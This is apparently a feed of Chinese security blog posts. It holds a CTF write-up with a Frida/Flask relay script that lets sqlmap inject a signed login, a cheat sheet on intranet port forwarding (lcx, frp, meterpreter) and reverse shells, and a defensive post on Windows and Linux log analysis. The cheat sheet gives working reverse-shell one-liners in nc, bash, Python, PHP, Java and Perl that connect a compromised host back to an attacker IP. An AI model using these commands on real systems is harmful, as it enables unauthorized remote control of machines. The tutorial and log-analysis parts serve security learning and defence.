class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask</span><br><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> request</span><br><span class="line"><span class="keyword">import</span> frida</span><br><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line"></span><br><span class="line">sign_result = <span class="string">&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line">jscode = <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">Java.perform(function () &#123;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    var sign = Java.use(&quot;com.example.dlive.tsctf2017.Sign&quot;);</span></span><br><span class="line"><span class="string">    var result = sign.sign(&quot;%s&quot;, &quot;%s&quot;);</span></span><br><span class="line"><span class="string">    send(result);</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">&#125;);</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"></span><br><span class="line">frida_session = frida.get_device_manager().enumerate_devices()[-<span class="number">1</span>].attach(<span class="string">&quot;com.example.dlive.tsctf2017&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">on_message</span>(<span class="params">message, data</span>):</span></span><br><span class="line">    <span class="keyword">global</span> sign_result</span><br><span class="line">    sign_result = hashlib.md5(message[<span class="string">&#x27;payload&#x27;</span>]).hexdigest()</span><br><span class="line">    <span class="comment"># print sign_result</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">sign</span>(<span class="params">username, password</span>):</span></span><br><span class="line">    <span class="keyword">global</span> frida_session</span><br><span class="line">    <span class="keyword">global</span> jscode</span><br><span class="line">    username = username.replace(<span class="string">&#x27;&quot;&#x27;</span>, <span class="string">&#x27;\\&quot;&#x27;</span>)</span><br><span class="line">    script = frida_session.create_script(jscode % (username, password))</span><br><span class="line">    script.on(<span class="string">&#x27;message&#x27;</span>, on_message)</span><br><span class="line">    script.load()</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/forward&#x27;</span>, methods=[<span class="string">&#x27;POST&#x27;</span>]</span>)</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">login</span>():</span></span><br><span class="line">    url = <span class="string">&#x27;http://10.101.162.128/sign.php&#x27;</span></span><br><span class="line">    username = request.form[<span class="string">&#x27;username&#x27;</span>]</span><br><span class="line">    password = request.form[<span class="string">&#x27;password&#x27;</span>]</span><br><span class="line">    session = requests.session()</span><br><span class="line">    sign(username, password)</span><br><span class="line">    http = session.post(url, data=&#123;<span class="string">&#x27;username&#x27;</span>: username, <span class="string">&#x27;password&#x27;</span>: password, <span class="string">&#x27;sign&#x27;</span>: sign_result&#125;, timeout=<span class="number">5</span>, allow_redirects=<span class="literal">False</span>)</span><br><span class="line">    <span class="keyword">return</span> http.content</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    app.run()</span><br></pre></td></tr></table></figure><p>使用sqlmap注入，目标url是该中转脚本</p><p><img src="https://raw.githubusercontent.com/bbbstark/images/main/6922261-6d9af65fc338f089.png" alt="img"></p><p>image</p><p><img src="https://raw.githubusercontent.com/bbbstark/images/main/6922261-fc318d8f20819f1c.png" alt="img"></p><p>image</p><p><img src="https://raw.githubusercontent.com/bbbstark/images/main/6922261-07438de1d7a1e6c3.png" alt="img"></p><p>image</p><p>中转注入是稍微方便了不少，但是在注入的时候frida特别容易挂掉QAQ</p><h2 id="0x06-参考"><a href="#0x06-参考" class="headerlink" title="0x06 参考"></a>0x06 参考</h2><p><a href="https://links.jianshu.com/go?to=https://sec.xiaomi.com/article/23">https://sec.xiaomi.com/article/23</a><br><a href="https://links.jianshu.com/go?to=https://github.com/dweinstein/awesome-frida">https://github.com/dweinstein/awesome-frida</a><br><a href="https://links.jianshu.com/go?to=https://www.notsosecure.com/pentesting-android-apps-using-frida/">https://www.notsosecure.com/pentesting-android-apps-using-frida/</a><br><a href="https://links.jianshu.com/go?to=https://www.codemetrix.net/hacking-android-apps-with-frida-1/">https://www.codemetrix.net/hacking-android-apps-with-frida-1/</a><br><a href="https://links.jianshu.com/go?to=https://www.codemetrix.net/hacking-android-apps-with-frida-2/">https://www.codemetrix.net/hacking-android-apps-with-frida-2/</a><br><a href="https://links.jianshu.com/go?to=https://www.frida.re/">https://www.frida.re/</a><br><a href="https://www.jianshu.com/p/ca8381d3e094">http://www.jianshu.com/p/ca8381d3e094</a><br><a href="https://links.jianshu.com/go?to=http://www.voidcn.com/blog/asmcvc/article/p-6240248.html">http://www.voidcn.com/blog/asmcvc/article/p-6240248.html</a><br><a href="https://links.jianshu.com/go?to=http://wooyun.jozxing.cc/static/drops/tools-5602.html">http://wooyun.jozxing.cc/static/drops/tools-5602.html</a></p><p>本文摘自：author: dlive<br><a href="https://links.jianshu.com/go?to=https://www.cnblogs.com/dliv3/p/6753868.html">https://www.cnblogs.com/dliv3/p/6753868.html</a><br>喜欢爬虫的关注个人公众号：python撸码</p><p><a href="https://www.jianshu.com/nb/17026636">https://www.jianshu.com/nb/17026636</a>)</p>]]></content>
      
      
      
        <tags>
            
            <tag> 逆向 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>内网端口转发及shell反弹</title>
      <link href="/posts/48384/"/>
      <url>/posts/48384/</url>
      
        <content type="html"><![CDATA[<h2 id="端口转发工具-LCX"><a href="#端口转发工具-LCX" class="headerlink" title="端口转发工具 LCX"></a>端口转发工具 LCX</h2><h3 id="Windows-LCX"><a href="#Windows-LCX" class="headerlink" title="Windows LCX"></a>Windows LCX</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">• 转发端口：lcx.exe –slave 公网主机IP 端口 内网主机IP 端口</span><br><span class="line">• 监听端口：lcx.exe –listen 转发端口 本机任意没有被占用的端口</span><br><span class="line">• 映射端口：lcx.exe -tran 映射端口号 目标ip 目标端口</span><br></pre></td></tr></table></figure><p><strong>本地端口映射:</strong></p><p>场景一:</p><p>主机的3389端口只对内开放，不对外开放,需要端口映射到本机一个开放端口且没有绑定服务的端口,然后访问这个映射后的端口即可连上主机的3389.</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">lcx.exe –tran 53 127.0.0.1 3389</span><br></pre></td></tr></table></figure><p>场景二:</p><p>攻击机 —–&gt;(A)web服务器192.168.10.10——-&gt;(B)内网web服务器192.168.10.11</p><p>攻击机只能访问双网卡的主机(A)web服务器,我们无法直接访问同内网的主机B.通过端口映射可以把内网主机B的80端口映射出来,我们只需要访问主机A192.168.10.11:8080 即是访问主机B的80端口.</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">lcx.exe –tran 8080 192.168.10.11 80</span><br></pre></td></tr></table></figure><p><strong>内网端口转发</strong></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">转发端口：lcx.exe –slave 公网IP 公网端口 肉鸡的内网IP 肉鸡端口</span><br><span class="line">监听端口：lcx.exe –listen 转发端口 本机任意没有被占用的端口</span><br></pre></td></tr></table></figure><p><strong>本机:</strong></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">lcx -listen 2222 3333</span><br></pre></td></tr></table></figure><p>2222为转发端口，3333为本机任意未被占用的端口</p><p><strong>肉鸡：</strong></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">lcx -slave 119.75.217.56 2222 127.0.0.1 3389</span><br></pre></td></tr></table></figure><p>119.75.217.56 为本机IP,2222为转发端口，127.0.0.1为肉鸡内网IP，3389为远程终端端口</p><p>3389连接时格式 127.0.0.1:3333</p><h3 id="linux-portmap-lcx"><a href="#linux-portmap-lcx" class="headerlink" title="linux portmap(lcx)"></a>linux portmap(lcx)</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">Usage:./portmap -m method [-h1 host1] -p1 port1 [-h2 host2] -p2 port2 [-v] [-<span class="built_in">log</span> filename]</span><br><span class="line">-v: version</span><br><span class="line">-h1: host1</span><br><span class="line">-h2: host2</span><br><span class="line">-p1: port1</span><br><span class="line">-p2: port2</span><br><span class="line">-<span class="built_in">log</span>: <span class="built_in">log</span> the data</span><br><span class="line">-m: the action method <span class="keyword">for</span> this tool</span><br><span class="line">1: listen on PORT1 and connect to HOST2:PORT2</span><br><span class="line">2: listen on PORT1 and PORT2</span><br><span class="line">3: connect to HOST1:PORT1 and HOST2:PORT2</span><br></pre></td></tr></table></figure><p><strong>内网主机端口转发:</strong></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./portmap -m 3 -h1 127.0.0.1 -p1 22 -h2 118.*.*.* -p2 6666</span><br></pre></td></tr></table></figure><p><strong>公网主机监听端口:</strong></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./portmap -m 2 -p1 6666 -h2 118.*.*.* -p2 7777</span><br></pre></td></tr></table></figure><p>开始监听6666传来的数据，然后监听7777端口提供访问</p><h2 id="端口转发工具-FRP"><a href="#端口转发工具-FRP" class="headerlink" title="端口转发工具 FRP"></a>端口转发工具 FRP</h2><p>frps</p><p>frps.ini</p><p>服务端程序和服务端配置文件（s结尾代表server)</p><p>frpc</p><p>frpc.ini</p><p>客户端程序和客户端配置文件（c结尾代表client）</p><p><strong>frps.ini格式为:</strong></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">[common] </span><br><span class="line">bind_port = 7000 <span class="comment">#frp服务器监听端口</span></span><br><span class="line">dashboard_port = 7500 <span class="comment">#web后台监听端口</span></span><br><span class="line">dashboard_user = admin <span class="comment">#web后台的用户名和密码</span></span><br><span class="line">dashboard_pwd = admin</span><br><span class="line">token = 123456 <span class="comment">#用于客户端和服务端连接的口令，请自行设置并记录</span></span><br></pre></td></tr></table></figure><p><strong>运行:</strong></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./frps -c frps.ini</span><br></pre></td></tr></table></figure><p><strong>frpc.ini格式为:</strong></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">[common]</span><br><span class="line">server_addr = 192.168.152.217 <span class="comment">#服务端IP地址</span></span><br><span class="line">server_port = 7000 <span class="comment">#服务器端口</span></span><br><span class="line">token = 123456 <span class="comment">#服务器上设置的连接口令</span></span><br><span class="line">[rdp] <span class="comment">#自定义规则，[xxx]表示规则名</span></span><br><span class="line"><span class="built_in">type</span> = tcp <span class="comment">#type：转发的协议类型</span></span><br><span class="line">local_ip = 127.0.0.1 </span><br><span class="line">local_port = 3389 <span class="comment">#本地应用的端口号</span></span><br><span class="line">remote_port = 7001 <span class="comment">#这条规则在服务端开放的端口号</span></span><br></pre></td></tr></table></figure><p><strong>运行:</strong></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./frpc -c frpc.ini</span><br></pre></td></tr></table></figure><h2 id="meterpreter-Portfwd"><a href="#meterpreter-Portfwd" class="headerlink" title="meterpreter Portfwd"></a>meterpreter Portfwd</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">Ø 选项</span><br><span class="line">• -L：要监听的本地主机（可选）</span><br><span class="line">• -h：帮助信息</span><br><span class="line">• -l：要监听的本地端口，与此端口的连接将被转发到远程系统</span><br><span class="line">• -p：要连接的远程端口，TCP连接将转发到的端口</span><br><span class="line">• -r：要连接的远程主机的IP地址</span><br><span class="line">Ø 参数</span><br><span class="line">• Add：该参数用于创建转发</span><br><span class="line">• Delete：这将从转发端口列表中删除先前的条目</span><br><span class="line">• List：列出当前转发的所有端口</span><br><span class="line">• Flush：这将删除转发列表中的所有端</span><br></pre></td></tr></table></figure><p><strong>ADD</strong></p><p>• add：将端口转发添加到列表中，并创建一个隧道</p><p> • -l：本地端口，将被监听并转发到我们的目标，这可以是机器上上的任何端口，只要它尚未被使用的</p><p> • -p：是目标机上的目标端口</p><p> • -r [target host] 是目标机的IP或主机名</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">meterpreter &gt; portfwd add –l 本地监听端口号 –p 目标端口号 –r 目标机的IP地址</span><br></pre></td></tr></table></figure><p><strong>Delete</strong></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">meterpreter &gt; portfwd delete –l 本地监听端口号 –p 目标端口号 –r 目标机的IP地址</span><br></pre></td></tr></table></figure><p><strong>List</strong></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">meterpreter &gt; portfwd list    <span class="comment">#列出所有转发规则</span></span><br></pre></td></tr></table></figure><p><strong>Flush</strong></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">meterpreter &gt; portfwd flush   <span class="comment">#清空所有规则</span></span><br></pre></td></tr></table></figure><h2 id="NC反弹shell"><a href="#NC反弹shell" class="headerlink" title="NC反弹shell"></a>NC反弹shell</h2><p><strong>反向shell</strong></p><p>攻击机:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc -lvp 8080  //lvnp 8080</span><br></pre></td></tr></table></figure><p>肉鸡端:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">nc 攻击机IP 监听端口号 –e /bin/bash <span class="comment">#Linux</span></span><br><span class="line">nc 攻击机IP 监听端口号 –e c:\windows\system32\cmd.exe <span class="comment">#Windows</span></span><br></pre></td></tr></table></figure><p><strong>正向shell</strong></p><p>攻击机:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc 目标主机IP地址 端口号</span><br></pre></td></tr></table></figure><p>肉鸡端:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">nc –lvp 端口号 –e /bin/bash <span class="comment">#Linux</span></span><br><span class="line">nc -lvp 端口号 –e c:\windows\system32\cmd.exe <span class="comment">#Windows</span></span><br></pre></td></tr></table></figure><h2 id="其他反弹shell"><a href="#其他反弹shell" class="headerlink" title="其他反弹shell"></a>其他反弹shell</h2><p><strong>攻击机监听:</strong></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc –lvvp 4444</span><br></pre></td></tr></table></figure><p><strong>bash 反弹shell</strong></p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">bash <span class="operator">-</span>i <span class="operator">&gt;</span><span class="operator">&amp;</span> <span class="operator">/</span>dev<span class="operator">/</span>tcp<span class="operator">/</span>攻击机IP<span class="operator">/</span>监听端口号 <span class="number">0</span><span class="operator">&gt;</span><span class="operator">&amp;</span><span class="number">1</span></span><br></pre></td></tr></table></figure><p><strong>python反弹shell</strong></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">python -c <span class="string">&#x27;import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&quot;攻击</span></span><br><span class="line"><span class="string">机IP地址&quot;,监听端口号));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);</span></span><br><span class="line"><span class="string">os.dup2(s.fileno(),2);p=subprocess.call([&quot;/bin/sh&quot;,&quot;-i&quot;]);&#x27;</span></span><br></pre></td></tr></table></figure><p> <strong>PHP 反弹shell</strong></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">php -r <span class="string">&#x27;$sock=fsockopen(&quot;攻击机IP地址&quot;,监听端口号);exec(&quot;/bin/sh -i &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3&quot;);&#x27;</span></span><br></pre></td></tr></table></figure><p><strong>JAVA 反弹shell</strong></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">r = Runtime.getRuntime()</span><br><span class="line">p = r.exec([<span class="string">&quot;/bin/bash&quot;</span>,<span class="string">&quot;-c&quot;</span>,<span class="string">&quot;exec 5&lt;&gt;/dev/tcp/攻击机IP地址/监听端口号;cat &lt;&amp;5 | while read line; do <span class="variable">$line</span></span></span><br><span class="line"><span class="string">2&gt;&amp;5 &gt;&amp;5; done&quot;</span>] as String[])</span><br><span class="line">p.waitFor()</span><br></pre></td></tr></table></figure><p><strong>Perl 反弹shell</strong></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">perl -e <span class="string">&#x27;use Socket;$i=&quot;攻击机IP地址&quot;;$p=监听端口</span></span><br><span class="line"><span class="string">号;socket(S,PF_INET,SOCK_STREAM,getprotobyname(&quot;tcp&quot;));if(connect(S,sockaddr_in($p,inet_aton($i))))&#123;ope</span></span><br><span class="line"><span class="string">n(STDIN,&quot;&gt;&amp;S&quot;);open(STDOUT,&quot;&gt;&amp;S&quot;);open(STDERR,&quot;&gt;&amp;S&quot;);exec(&quot;/bin/sh -i&quot;);&#125;;&#x27;</span></span><br></pre></td></tr></table></figure><p>socks4的代理，只能使用tcp协议</p>]]></content>
      
      
      
        <tags>
            
            <tag> 内网 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>安全加固</title>
      <link href="/posts/16430/"/>
      <url>/posts/16430/</url>
      
        <content type="html"><![CDATA[<h2 id="日志"><a href="#日志" class="headerlink" title="日志"></a>日志</h2><h3 id="Windows日志"><a href="#Windows日志" class="headerlink" title="Windows日志"></a>Windows日志</h3><p>事件类型：分为4种，分别为 “应用程序日志” 、”系统日志” 、”安全日志” 和 “转发事件” ，前三个为核心日志文件,Windows日志分析工具Log Parser.</p><ol><li>应用程序日志<br> • 包含由应用程序或系统程序记录的事件，主要记录程序运行方面的事件,其中远程桌面连接日志就在这里,Microsoft/Windows/remote*</li></ol><p>  • 日志默认位置： %SystemRoot%\System32\Winevt\Logs\Application.evtx</p><ol start="2"><li>系统日志<br> • 记录操作系统组件产生的事件，主要包括驱动程序、系统组件和应用软件的崩溃以及数据丢失错误等</li></ol><p>  日志默认位置： %SystemRoot%\System32\Winevt\Logs\System.evtx</p><ol start="3"><li>安全日志<br> • 包含安全性相关的事件，如用户权限变更，登录及注销，文件及文件夹访问，打印等信息</li></ol><p>  日志默认位置： %SystemRoot%\System32\Winevt\Logs\Security.evtx</p><p>常见的事件ID:</p><table><thead><tr><th>事件ID</th><th>说明</th></tr></thead><tbody><tr><td>4634</td><td>注销成功</td></tr><tr><td>4624</td><td>账号成功登录</td></tr><tr><td>4625</td><td>账号登录失败</td></tr><tr><td>4720</td><td>创建用户</td></tr><tr><td>4726</td><td>删除用户</td></tr><tr><td>4672</td><td>使用超级用户（如管理员）进行登录</td></tr><tr><td>4647</td><td>用户启动的注销</td></tr></tbody></table><p>事件ID在线搜索:  <a href="https://docs.microsoft.com/en-us/windows/security/threat-protection/">https://docs.microsoft.com/en-us/windows/security/threat-protection/</a> </p><p>常见的登录类型:</p><table><thead><tr><th>类型ID</th><th>描述</th><th>说明</th><th>典型情况</th></tr></thead><tbody><tr><td>2</td><td>本地交互式</td><td>用户在本地登录</td><td>使用域或者本地账户登录本地主机</td></tr><tr><td>3</td><td>网络方式</td><td>从网络访问主机</td><td>例如访问一台主机的某个共享文件夹</td></tr><tr><td>4</td><td>批处理</td><td>作为批处理登录</td><td>指定计划任务时指定的以某个具体账户来运行</td></tr><tr><td>5</td><td>服务</td><td>以服务方式登录</td><td>指在指定服务器运行时以本地系统账户或者时具体某个账户运行</td></tr><tr><td>8</td><td>网络明文</td><td>密码在网络上明文传输</td><td>如登录FTP是通过明文传输</td></tr><tr><td>10</td><td>远程交互</td><td>通过终端服务、远程桌面访问计算机</td><td>使用本地mstsc客户端远程登录某台主机</td></tr></tbody></table><h3 id="Linux日志"><a href="#Linux日志" class="headerlink" title="Linux日志"></a>Linux日志</h3><p><strong>linux日志的分类:</strong></p><ol><li>内核及系统日志<br> • 由系统服务rsyslog统一进行管理，日志格式基本相似</li><li>用户日志<br> • 记录系统用户登录及退出系统的相关信息</li><li>程序日志<br> • 由相应的应用程序进行独立管理。如：web服务，ftp服务</li></ol><p><strong>日志默认保存位置:</strong><br>• 默认位于：/var/log/ 或创建子目录再创建日志文件</p><p><strong>系统日志概述:</strong></p><p>• 由系统服务 rsyslog 统一管理，默认的日志守护进程为 rsyslog , rsyslog 是 syslog 的升级版本，默认安装，随机启动。<br>• 主要程序：/sbin/rsyslog<br>• 主配置文件：/etc/rsyslog.conf 和 /etc/rsyslog.d</p><p>• 查看日志配置情况：more /etc/rsyslog.conf</p><p><strong>linux日志类型:</strong></p><table><thead><tr><th>类型</th><th>说明</th></tr></thead><tbody><tr><td>auth</td><td>用户认证时产生的日志。如：login命令、su命令</td></tr><tr><td>authpriv</td><td>与auth类似，只能特定用户查看</td></tr><tr><td>console</td><td>系统控制台的消息</td></tr><tr><td>cron</td><td>计划任务产生的日志</td></tr><tr><td>daemon</td><td>某些守护进程产生的日志 ftp ftp服务</td></tr><tr><td>kern</td><td>系统内核消息</td></tr><tr><td>local0-local7</td><td>由自定义程序使用</td></tr><tr><td>lpr</td><td>与打印机活动有关</td></tr><tr><td>mail</td><td>邮件日志</td></tr><tr><td>mark</td><td>产生时间戳，可以推断系统发生故障的大致时间。</td></tr><tr><td>news</td><td>网络新闻传输协议（nntp）产生的消息</td></tr><tr><td>ntp</td><td>网络时间协议（ntp）产生的消息 user 用户进程</td></tr></tbody></table><p><strong>Linux常见日志文件</strong></p><table><thead><tr><th>日志</th><th>说明</th></tr></thead><tbody><tr><td>/var/log/boot.log</td><td>记录了系统在引导过程中发生的事件，就是Linux系统开机自检过程显示的信息</td></tr><tr><td>/var/log/lastlog</td><td>记录最后一次用户成功登录的时间、登录IP等信息</td></tr><tr><td>/var/log/messages</td><td>记录Linux操作系统常见的系统和服务错误信息</td></tr><tr><td>/var/log/secure</td><td>Linux系统安全日志，记录用户和工作组变化情况、用户登录认证情况</td></tr><tr><td>/var/log/btmp</td><td>记录Linux登录失败的用户、时间及远程IP地址</td></tr><tr><td>/var/log/wtmp</td><td>该日志文件永久记录每个登录、注销及系统的启动、停机的时间</td></tr><tr><td>/var/log/utmp</td><td>该日志文件记录有关当前登录的每个用户的信息</td></tr></tbody></table><p><strong>常用命令:</strong></p><table><thead><tr><th>命令</th><th>说明</th><th>对应日志</th></tr></thead><tbody><tr><td>lastlog</td><td>查看的某系统用户最后一次登录的记录</td><td>/var/log/lastlog</td></tr><tr><td>who&amp;W</td><td>访问utmp记录，显示当前正在登录的用户信息</td><td>/var/log/utmp</td></tr><tr><td>lastb</td><td>记录Linux登陆失败的用户、时间以及远程IP地址</td><td>/var/log/btmp</td></tr><tr><td></td><td></td><td></td></tr><tr><td></td><td></td><td></td></tr></tbody></table><p><strong>日志分析技巧</strong></p><p>分析安全日志：/var/log/secure</p><ol><li>定位有多少IP在爆破主机的root帐号：</li></ol><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">grep <span class="string">&quot;Failed password for root&quot;</span> /var/<span class="built_in">log</span>/secure | awk <span class="string">&#x27;&#123;print $11&#125;&#x27;</span> | sort | uniq -c | sort -nr | more</span><br></pre></td></tr></table></figure><ol start="2"><li>定位有哪些IP在爆破：<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">grep <span class="string">&quot;Failed password&quot;</span> /var/<span class="built_in">log</span>/secure|grep -E -o <span class="string">&quot;(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)&quot;</span>|uniq -c</span><br></pre></td></tr></table></figure></li><li>爆破用户名字典是什么？<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">grep <span class="string">&quot;Failed password&quot;</span> /var/<span class="built_in">log</span>/secure|perl -e <span class="string">&#x27;while($_=&lt;&gt;)&#123; /for(.*?) from/; print &quot;$1\n&quot;;&#125;&#x27;</span>|uniq -c|sort -nr</span><br></pre></td></tr></table></figure></li><li>定位有多少IP在爆破主机的root帐号：<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">grep <span class="string">&quot;Accepted &quot;</span> /var/<span class="built_in">log</span>/secure | awk <span class="string">&#x27;&#123;print $11&#125;&#x27;</span> | sort | uniq -c | sort -nr | more</span><br></pre></td></tr></table></figure></li><li>定位有哪些IP在爆破：<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">grep <span class="string">&quot;Accepted &quot;</span> /var/<span class="built_in">log</span>/secure | awk <span class="string">&#x27;&#123;print $1,$2,$3,$9,$11&#125;&#x27;</span></span><br></pre></td></tr></table></figure></li></ol><h3 id="中间件日志"><a href="#中间件日志" class="headerlink" title="中间件日志"></a>中间件日志</h3><h4 id="Apache日志"><a href="#Apache日志" class="headerlink" title="Apache日志"></a><strong>Apache日志</strong></h4><p>Apache日志存放位置:<br>• windows系统，日志文件保存在Apache安装目录的logs子目录中 </p><p>• Linux系统，默认安装的情况下，在 /usr/local/apache/logs 下</p><p>Apache日志类型:</p><ol><li><strong>访问日志</strong></li></ol><p>access_log 为访问日志，记录所有对 apache 服务器进行请求的访问</p><ol><li><strong>错误日志</strong> </li></ol><p>错误日志记录了服务器运行期间遇到的各种错误，以及一些普通的诊断信息，比如服务器何时启动、何时关闭等 </p><ol><li>传输日志 </li><li>Cookie日志</li></ol><p>Apache日志分析技巧:</p><ol><li>查看 IP<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cat access_log | awk <span class="string">&#x27;&#123;print $1&#125;&#x27;</span></span><br></pre></td></tr></table></figure></li><li>显示访问前10 位的IP 地址，便于查找攻击源</li></ol><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cat access_log|awk <span class="string">&#x27;&#123;print $1&#125;&#x27;</span>|sort|uniq -c|sort -nr|head -10</span><br></pre></td></tr></table></figure><ol start="3"><li><p>显示指定时间以后的日志</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cat access_log |awk <span class="string">&#x27;$4&gt;=&quot;[1/Jan/2020:00:00:00&quot;&#x27;</span></span><br></pre></td></tr></table></figure></li><li><p>查看某一时间内的 IP 连接情况</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">grep <span class="string">&quot;2020:05&quot;</span>access_log |awk <span class="string">&#x27;&#123;print $4&#125;&#x27;</span>|sort|uniq –c |sort -nr</span><br></pre></td></tr></table></figure></li><li><p>查看指定的 IP 做了什么b查看最近访问量最高的文件</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cat access_log |tail 10000| awk <span class="string">&#x27;&#123;print $7&#125;&#x27;</span>| sort|uniq –c |sort –nr|less</span><br></pre></td></tr></table></figure></li></ol><h4 id="iiS日志"><a href="#iiS日志" class="headerlink" title="iiS日志"></a>iiS日志</h4><p> <strong>日志文件默认位置</strong><br>• 